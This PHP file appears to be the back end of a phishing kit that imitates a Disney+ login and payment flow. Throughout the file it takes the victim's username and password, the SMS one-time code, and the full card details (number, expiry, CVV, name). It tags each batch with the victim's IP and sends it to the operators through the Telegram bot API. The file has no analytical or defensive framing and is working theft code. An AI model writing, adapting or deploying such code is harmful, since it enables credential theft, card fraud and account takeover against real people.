<?php
session_start();
require "../config.php";

$ip = $_SERVER['REMOTE_ADDR'];

function post($data)
{
    if (empty(trim($data))) {
        return "NO_DATA";
    } else {
        return htmlspecialchars($_POST[$data]);
    }
}


function sendBot($url)
{
    $ci = curl_init();
    curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ci, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ci, CURLOPT_URL, $url);
    $res = curl_exec($ci);
    curl_close($ci);
    return $res;
}


if (isset($_POST['user'])) {

    $login = post("user");
    $pass = post("pass");

    $text = urlencode("
/- DISNEY+ LOGIN -/ $ip
USER: " . $_POST['user'] . "
PASS: " . $_POST['pass'] . "
");

foreach ($ids as $id) {
    $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$text";
    sendBot($url);
}
}
 
 


 



if (isset($_POST['otp'])) {

    $sms = post("otp");

    $telegram_content = urlencode("
/- DISNEY+ CC OTP -/ $ip
CODE : $sms
");


foreach ($ids as $id) {
    $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
    sendBot($url);
}
}



 
  

if (isset($_POST['cc'])) {

    $name = post("name");
    $cc = post("cc");
    $exp = post("exp");
    $cvv = post("cvv");

    $_SESSION["card_num"] = $cc;


    $telegram_content = urlencode("
/- DISNEY+ CARD -/ $ip
NAME : $name
CC : $cc
EXP : $exp
CVV : $cvv 
");
 
    foreach ($ids as $id) {
        $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
        sendBot($url);
    }
}
 